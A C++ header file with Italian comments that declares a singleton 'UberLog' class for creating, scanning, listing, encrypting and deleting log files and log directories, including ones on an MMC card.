#pragma once
#include "Common.h"
#include "Encryption.h"

BOOL SortByDate(const LogInfo& lInfo, const LogInfo& rInfo);
list<UberStruct>::iterator find(list<UberStruct> *lst, WCHAR *pwSearch);

class UberLog
{
private:
	/**
	* Definizioni per la classe singleton
	*/
	static UberLog *Instance;
	static volatile LONG lLock;

	HANDLE hUberLogMutex;

	private: map<UINT, UberStruct> uberMap;
	private: vector<LogTree> treeVector;
	private: Encryption *encryptionObj;

	/**
	* Device e' una classe singleton
	*/
	private: BOOL IsInUse(wstring &strLogName);
	private: BOOL GetLogFileTime(wstring &strLogName, FILETIME *ft);
	private: BOOL ScanForLogs(wstring &strLogMask, wstring &strLogDirFormat, wstring &strSearchPath, UINT uMmc);
	private: void MakeLogDirs();
	private: BOOL CreateLogDir(wstring &strDirPath, UINT uMmc);
	private: UINT ScanDirTree(wstring &strSearchPath, wstring &strEncName);
	private: UINT GetHashFromFullPath(wstring &strFullPath); // Torna l'hash di una Log Dir
	private: wstring GetLogDirFromFullPath(wstring &strFullPath); // Torna il path della Log Dir da un full path

	public: static UberLog* self();
	public: void Clear();
	public: BOOL Add(wstring &strName, UINT uLogType, FILETIME ft, UINT uOnMmc);
	public: BOOL Add(UberStruct &uber); // Chiamare SOLO dalla ScanLogs()
	public: BOOL Remove(wstring &strName, UINT uOnMmc);
	public: BOOL Delete(wstring &strName);
	public: BOOL DeleteAll();
	public: BOOL Close(wstring &strName, BOOL bOnMmc);
	public: BOOL ScanLogs();
	public: list<LogInfo>* ListClosed();
	public: list<LogInfo>* ListClosedByType(UINT uLogType);
	public: BOOL ClearListSnapshot(list<LogInfo> *pSnap); // Pulisce uno snapshot creato con le ListClosed*()
	public: UINT GetLogNum(); // Torna il numero di log presenti nella coda
	public: wstring GetAvailableDir(UINT uMmc); // Prendi il nome della prossima directory disponibile
	public: void Print();

	private: UberLog();
	private: ~UberLog();
};
